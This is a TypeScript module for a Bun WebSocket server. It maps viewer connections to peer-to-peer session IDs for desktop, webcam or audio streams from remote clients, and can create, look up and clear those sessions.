import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
import type { SocketData } from "../sessions/types";

export type P2PKind = "desktop" | "webcam" | "audio";

export type P2PSession = {
  viewer: ServerWebSocket<SocketData>;
  clientId: string;
  kind: P2PKind;
};

const p2pAgentToViewer = new Map<string, P2PSession>();
const p2pViewerToAgent = new WeakMap<ServerWebSocket<SocketData>, string>();

export function createP2PSession(ws: ServerWebSocket<SocketData>, clientId: string, kind: P2PKind): string {
  const prior = p2pViewerToAgent.get(ws);
  if (prior) {
    p2pAgentToViewer.delete(prior);
  }
  const sessionId = uuidv4();
  p2pAgentToViewer.set(sessionId, { viewer: ws, clientId, kind });
  p2pViewerToAgent.set(ws, sessionId);
  return sessionId;
}

export function lookupP2PSession(sessionId: string): P2PSession | undefined {
  return p2pAgentToViewer.get(sessionId);
}

export function getP2PSessionIdForViewer(ws: ServerWebSocket<SocketData>): string | undefined {
  return p2pViewerToAgent.get(ws);
}

export function clearP2PSessionForViewer(ws: ServerWebSocket<SocketData>):
  | { sessionId: string; clientId: string; kind: P2PKind }
  | null {
  const sessionId = p2pViewerToAgent.get(ws);
  if (!sessionId) return null;
  const entry = p2pAgentToViewer.get(sessionId);
  p2pAgentToViewer.delete(sessionId);
  p2pViewerToAgent.delete(ws);
  if (!entry) return null;
  return { sessionId, clientId: entry.clientId, kind: entry.kind };
}
